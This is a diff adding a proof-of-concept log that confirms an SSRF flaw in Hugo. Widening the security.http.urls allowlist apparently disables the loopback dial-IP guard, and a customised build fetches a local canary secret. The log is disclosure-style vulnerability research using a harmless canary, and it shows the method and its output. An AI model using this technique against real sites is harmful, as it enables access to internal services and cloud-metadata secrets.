@@ -1,0 +1,14 @@
+==============================================================================
+VULN-001: GetRemote dial-IP SSRF guard disabled by any http.urls customization
+target: throwaway `hugo` build -> loopback canary listener
+[INFO] exercising config/security/securityConfig.go CheckAllowedHTTPAddress (return nil when urls!=default)
+==============================================================================
+[SETUP] internal canary HTTP listener on 127.0.0.1:41455 (serves secret 'CANARY-2779fbe0'); hostname internalcanary.test pinned to 127.0.0.1
+[STEP] build #1 with DEFAULT security.http.urls (guard active)
+[PROOF] default: listener hits=0  canary-in-output=False  (expect blocked: 0 hits / FETCH_ERR)
+[INFO] default output: FETCH_ERR:template: index.html:2:24: executing &#34;index.html&#34; at &lt;resources.GetRemote&gt;: error calling GetRemote: Get &#34;http://internalcanary.test
+[STEP] build #2 with CUSTOMIZED security.http.urls = ['(?i)^https?://'] (guard skipped)
+[PROOF] customized: listener hits=1  canary-in-output=True  reached_internal=YES
+[INFO] customized output: FETCHED:CANARY-2779fbe0
+[OK] exploit confirmed — under the DEFAULT allowlist the dial guard BLOCKED the loopback fetch (0 hits), but after a single http.urls edit the same hostname reached 127.0.0.1 and the build rendered the internal secret 'CANARY-2779fbe0'. The resolved-IP anti-rebind guard is disabled by any customization -> SSRF to loopback/private/cloud-metadata.
+==> VULN-001: CONFIRMED — customizing security.http.urls disables the SSRF dial-IP guard
